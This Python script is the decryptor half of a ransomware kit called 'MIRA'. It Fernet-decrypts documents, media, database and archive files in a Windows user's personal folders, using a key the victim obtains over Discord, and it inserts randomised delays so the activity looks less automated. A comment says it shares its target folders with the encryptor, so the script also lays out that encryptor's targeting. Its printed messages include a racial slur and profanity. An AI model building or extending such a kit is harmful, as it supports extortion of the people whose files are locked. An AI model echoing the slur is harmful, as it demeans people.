import os
import base64
import time
import random
import string
import getpass
from cryptography.fernet import Fernet, InvalidToken

# Same target folders as the encryptor
target_folders = [
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Desktop"),
    os.path.expanduser("~\\Downloads"),
    os.path.expanduser("~\\Pictures"),
    os.path.expanduser("~\\Videos"),
    os.path.expanduser("~\\Music")
]


encrypted_exts = [
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".zip", ".rar", ".7z", ".txt", ".jpg", ".jpeg", ".png",
    ".mp4", ".mkv", ".avi", ".mp3", ".sql", ".db", ".csv"
]

def decrypt_file(filepath, fernet):
    try:
        with open(filepath, "rb") as f:
            enc_data = f.read()
        data = fernet.decrypt(enc_data)
        with open(filepath, "wb") as f:
            f.write(data)
        print(f"Decrypted: {filepath}")
        time.sleep(0.02 + random.random() * 0.05)  # tiny delay to not look too robotic
    except InvalidToken:
        print(f"Bad key or not encrypted: {filepath}")
    except Exception as e:
        print(f"Failed {filepath}: {e}")

def scan_and_decrypt(fernet):
    count = 0
    for folder in target_folders:
        if not os.path.exists(folder):
            continue
        for root, dirs, files in os.walk(folder):
            for name in files:
                ext = os.path.splitext(name.lower())[1]
                if ext in encrypted_exts:
                    full = os.path.join(root, name)
                    decrypt_file(full, fernet)
                    count += 1
                    if count % 15 == 0:
                        time.sleep(random.uniform(0.4, 1.2))
    return count

def main():
    print("MIRA RANSOMWARE DECRYPTOR")
    print("Paste the base64 key you got from Discord:")
    key_b64 = input("> ").strip()

    try:
        key_bytes = base64.urlsafe_b64decode(key_b64)
        fernet = Fernet(key_bytes)
        print("Key looks good. Starting decrypt...\n")
    except Exception as e:
        print(f"Invalid key nigga: {e}")
        return

    total = scan_and_decrypt(fernet)
    print(f"\nDone. Decrypted {total} files.")
    print("Check your folders. If shit still fucked, key was wrong or file got corrupted.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"Crash: {e}")
